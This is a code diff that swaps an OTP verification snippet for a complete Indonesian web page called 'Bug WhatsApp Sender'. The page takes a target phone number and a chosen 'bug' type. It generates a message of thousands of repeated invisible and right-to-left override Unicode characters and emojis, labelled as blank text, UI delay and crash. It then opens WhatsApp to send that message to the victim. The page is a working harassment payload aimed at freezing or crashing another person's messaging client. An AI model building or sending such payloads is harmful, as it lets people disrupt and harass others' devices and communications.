@@ -1,55 +1,111 @@
-<!-- Sama seperti sebelumnya, tapi: -->
-<script>
-  let verified = false;
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <title>Bug WhatsApp Sender</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+    body {
+      font-family: 'Poppins', sans-serif;
+      background: #0f1115;
+      color: #fff;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 40px 20px;
+      min-height: 100vh;
+    }
+    h2 {
+      font-size: 26px;
+      margin-bottom: 30px;
+      color: #25D366;
+    }
+    input, select, button {
+      width: 100%;
+      max-width: 400px;
+      margin: 10px 0;
+      padding: 15px;
+      border: none;
+      border-radius: 8px;
+      font-size: 16px;
+      font-family: inherit;
+    }
+    input, select {
+      background: #1f1f24;
+      color: #fff;
+    }
+    button {
+      background: #25D366;
+      color: #000;
+      font-weight: bold;
+      transition: 0.3s ease;
+      cursor: pointer;
+    }
+    button:hover {
+      background: #1ebe5d;
+      transform: scale(1.05);
+    }
+    .container {
+      width: 100%;
+      max-width: 420px;
+      background: #191b1f;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 0 30px rgba(0, 255, 100, 0.1);
+    }
+    .label {
+      text-align: left;
+      width: 100%;
+      max-width: 400px;
+      font-weight: 600;
+      margin-top: 15px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>🧨 Bug WhatsApp Sender</h2>
 
-  async function kirimKode() {
-    const nomor = document.getElementById('nomor').value.trim();
-    const status = document.getElementById('status');
+    <div class="label">📱 Nomor Target (awali 62):</div>
+    <input id="nomor" placeholder="Contoh: 6281234567890" />
 
-    if (!/^62[0-9]{9,15}$/.test(nomor)) {
-      status.innerText = "❌ Nomor tidak valid.";
-      return;
+    <div class="label">💣 Jenis Bug:</div>
+    <select id="jenis">
+      <option value="blank">🕳️ Blank Text</option>
+      <option value="ui">🐢 UI Delay</option>
+      <option value="crash">💥 Crash Ringan</option>
+    </select>
+
+    <button onclick="kirim()">🚀 KIRIM SEKARANG</button>
+  </div>
+
+  <script>
+    function getBug(type) {
+      let bug1 = "\u3164\u3164\u3164\u3164\u3164".repeat(3000); // Blank
+      let bug2 = "\u200F\u202E\u2063\u3164".repeat(4000);       // UI Delay
+      let bug3 = "\u202E\u202E\u202E\u202E".repeat(2000) + "🔒".repeat(300); // Crash
+
+      if (type === "blank") return bug1;
+      if (type === "ui") return bug2;
+      if (type === "crash") return bug3;
     }
 
-    status.innerText = "⏳ Mengirim kode OTP...";
+    function kirim() {
+      const nomor = document.getElementById("nomor").value.trim();
+      const jenis = document.getElementById("jenis").value;
+      const bug = encodeURIComponent(getBug(jenis));
 
-    const res = await fetch('/api/send-otp', {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ nomor })
-    });
+      if (!/^62\\d{8,15}$/.test(nomor)) {
+        alert("Masukkan nomor yang valid diawali 62 tanpa spasi atau +");
+        return;
+      }
 
-    const json = await res.json();
-    if (json.ok) {
-      status.innerText = "✅ Kode OTP telah dikirim via WhatsApp.";
-    } else {
-      status.innerText = `❌ Gagal kirim OTP: ${json.error}`;
+      window.open(`https://wa.me/${nomor}?text=${bug}`, "_blank");
     }
-  }
-
-  async function verifikasiKode() {
-    const kode = document.getElementById('kode').value.trim();
-    const nomor = document.getElementById('nomor').value.trim();
-    const status = document.getElementById('status');
-
-    if (!kode) return status.innerText = "❌ Masukkan kode OTP";
-
-    // Kirim ke backend untuk diverifikasi
-    const res = await fetch('/api/verif-otp', {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ nomor, kode })
-    });
-
-    const json = await res.json();
-    if (json.ok) {
-      verified = true;
-      document.getElementById('pesan').disabled = false;
-      document.getElementById('btn-kirim').disabled = false;
-      document.getElementById('verif-status').style.display = "block";
-      status.innerText = "✅ Verifikasi berhasil.";
-    } else {
-      status.innerText = "❌ Kode salah atau kadaluarsa.";
-    }
-  }
-</script>
+  </script>
+</body>
+</html>
